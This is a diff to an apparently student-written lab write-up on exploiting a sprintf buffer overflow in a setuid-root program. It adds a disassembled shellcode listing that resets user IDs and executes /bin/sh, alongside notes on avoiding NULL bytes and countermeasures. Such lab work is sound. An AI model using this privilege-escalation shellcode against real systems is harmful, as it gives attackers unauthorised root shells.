@@ -79,7 +79,42 @@ int main(int argc, char *argv[]) {
 A comment about hints and resources. We primarily used the `.bash_history` file on dvader and the provided video material as inspiration for out exploit. Extensive googling and a hex calculator was also used.
 
 ### Instructions
-As mentioned previously, the main vulnerability is that the special user id bit is set for the binary and that root is owner. This means that the program is run with root priviledges, and any process that spawns from it can have the same level of priviledges. One important point that the shellcode comments make are the lack of NULL bytes, this is because it's a string terminator on unix and if it is included in the argument, it terminates it. Therefore not including the rest of the exploit. That's why instead of writing a zero (\00) to a register (to set the UID bit to 0) the register is xor'd with itself ("\x31\xc0"). 
+As mentioned previously, the main vulnerability is that the special user id bit is set for the binary and that root is owner. This means that the program is run with root priviledges, and any process that spawns from it can have the same level of priviledges. One important point that the shellcode comments make are the lack of NULL bytes, this is because it's a string terminator on unix and if it is included in the argument, it terminates it. Therefore not including the rest of the exploit. That's why instead of writing a zero (\00) to a register (to set the UID bit to 0) the register is xor'd with itself ("\x31\xc0"). To make it slightly easier to read, we built a binary of the hex representation of shellcode and deassemblied it.
+
+```
+   0:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
+   5:	31 c0                	xor    %eax,%eax
+   7:	b0 31                	mov    $0x31,%al
+   9:	cd 80                	int    $0x80
+   b:	89 c3                	mov    %eax,%ebx
+   d:	31 c0                	xor    %eax,%eax
+   f:	b0 46                	mov    $0x46,%al
+  11:	cd 80                	int    $0x80
+  13:	31 c0                	xor    %eax,%eax
+  15:	b0 32                	mov    $0x32,%al
+  17:	cd 80                	int    $0x80
+  19:	89 c3                	mov    %eax,%ebx
+  1b:	b0 31                	mov    $0x31,%al
+  1d:	b0 47                	mov    $0x47,%al
+  1f:	cd 80                	int    $0x80
+  21:	31 c0                	xor    %eax,%eax
+  23:	31 d2                	xor    %edx,%edx
+  25:	52                   	push   %edx
+  26:	68 2f 2f 73 68       	push   $0x68732f2f
+  2b:	68 2f 62 69 6e       	push   $0x6e69622f
+  30:	89 e3                	mov    %esp,%ebx
+  32:	52                   	push   %edx
+  33:	53                   	push   %ebx
+  34:	89 e1                	mov    %esp,%ecx
+  36:	b0 0b                	mov    $0xb,%al
+  38:	cd 80                	int    $0x80
+  3a:	31 c0                	xor    %eax,%eax
+  3c:	40                   	inc    %eax
+  3d:	cd 80                	int    $0x80
+  3f:	90                   	nop
+... (more nops)
+```
+
 
 ### Countermeasures
 - Language: If `snprinf` takes the size of the buffer as an argument, preventing buffer overflows. If it was used instead of `sprintf` then the exploit would not be possible. Using a static analyzer like Clang would help in detecting similar issues.
